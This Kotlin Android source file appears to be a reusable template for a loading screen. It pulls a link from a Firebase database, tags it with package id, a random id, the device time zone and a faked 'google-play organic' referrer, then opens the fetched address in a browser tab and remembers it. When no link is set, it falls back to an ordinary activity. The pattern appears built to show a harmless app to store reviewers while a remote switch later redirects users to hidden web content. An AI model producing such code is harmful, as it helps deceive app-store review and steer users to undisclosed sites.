package com.template

import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabColorSchemeParams
import androidx.browser.customtabs.CustomTabsIntent
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.tasks.Task
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.template.databinding.ActivityLoadingBinding
import kotlinx.coroutines.Dispatchers.IO
import kotlinx.coroutines.launch
import java.net.URL
import java.util.*


class LoadingActivity : AppCompatActivity() {

    private lateinit var firebaseAnalytics: FirebaseAnalytics

    private val binding by lazy {
        ActivityLoadingBinding.inflate(layoutInflater)
    }

    private val sharedPreferences by lazy {
        this.getSharedPreferences( SHARED_PREFS, Context.MODE_PRIVATE )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)

        firebaseAnalytics = Firebase.analytics
        FirebaseMessaging.getInstance().setDeliveryMetricsExportToBigQuery(true)

        if (getSharedPref(KEY_MARKER) != YES){
            dataProcessing(getData())

        }else {
            openCCT(getSharedPref(KEY))
        }
    }


    private fun getData(): Task<DataSnapshot> {
        binding.progressBar.visibility = View.VISIBLE

        val database = Firebase.database.reference

        return database
           .child(DB)
           .child(LINK)
           .get()
    }

    private fun dataProcessing(task: Task<DataSnapshot>){

        task.addOnSuccessListener {

            if (it.value == null || it.value.toString().isBlank()){
                binding.progressBar.visibility = View.GONE
                openActivity()
            } else {
                val url = getUrl(it.value.toString())
                binding.progressBar.visibility = View.GONE
                lifecycleScope.launch(IO) {
                    try {
                        val link = loadStringFromNetwork(url)

                        if (link != ERROR){
                            saveSharedPref(link)
                            openCCT(link)

                        } else {
                            saveSharedPref(link)
                            openActivity()
                        }
                    }catch (e: Exception){
                        saveSharedPref(EMPTY_STRING)
                        openActivity()
                    }
                }
            }
        }.addOnFailureListener {
            openActivity()
        }
    }

    private fun loadStringFromNetwork(link: String): String {
        val stream = URL(link).openConnection()
        val inputStream = stream.getInputStream()
        val reader = Scanner(inputStream)
        return reader.next()
    }

    private fun openCCT(link: String){

        val defaultColors = CustomTabColorSchemeParams.Builder()
            .setToolbarColor(Color.BLACK)
            .build()


        if (link.isBlank()){
            openActivity()
        }else{
            CustomTabsIntent
                .Builder()
                .setDefaultColorSchemeParams(defaultColors)
                .build()
                .launchUrl(this, Uri.parse(link))
        }
    }

    private fun saveSharedPref(url: String){

        sharedPreferences.edit().putString(KEY, url).apply()
        sharedPreferences.edit().putString(KEY_MARKER, YES).apply()

    }

    private fun openActivity(){
        val intent = Intent(this, MainActivity::class.java)
        this.startActivity(intent)
    }

    private fun getSharedPref(key: String) : String{
        return  sharedPreferences.getString(key, EMPTY_STRING) ?: EMPTY_STRING
    }

    private fun getUrl(baseUrl: String) : String {
        val packageId = application.packageName
        val javaUUID = UUID.randomUUID().toString()
        val timeZone = TimeZone.getDefault().id
        val getr = "utm_source=google-play&utm_medium=organic"

        return "$baseUrl/?packageid=$packageId&usserid=$javaUUID&getz=$timeZone&getr=$getr"
    }

    companion object {
        private const val KEY = "key"
        private const val KEY_MARKER = "key_marker"
        private const val SHARED_PREFS = "shared_prefs"
        private const val DB = "db"
        private const val LINK = "link"
        private const val YES = "yes"
        private const val ERROR = "error"
        private const val EMPTY_STRING = ""
    }
}
